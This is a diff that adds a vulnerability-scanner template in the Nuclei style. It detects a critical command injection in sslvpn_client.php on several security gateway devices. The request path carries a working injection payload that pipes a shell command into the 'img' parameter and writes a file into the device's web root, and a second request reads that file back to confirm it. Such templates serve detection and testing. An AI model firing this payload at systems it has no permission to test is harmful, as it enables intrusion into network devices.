@@ -1,0 +1,44 @@
+id: poc-yaml-multiple-security-gateway-devices-sslvpn-client-php-command-injection
+
+info:
+  name: Multiple Security Gateway Devices sslvpn_client.php Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+
+variables:
+  t1: "{{rand_text_alphanumeric(3)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-injection
+    method: GET
+    path:
+      - "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60pwd%60%20|tee%20/usr/local/webui/sslvpn/{{t1}}.txt|ls"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+          - "sslvpn"
+      - type: regex
+        regex:
+          - "^(?!.*<).*$" # Ensures the response does not contain '<'
+
+  - id: verify-injection
+    method: GET
+    path:
+      - "/sslvpn/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/usr/local/webui/sslvpn"
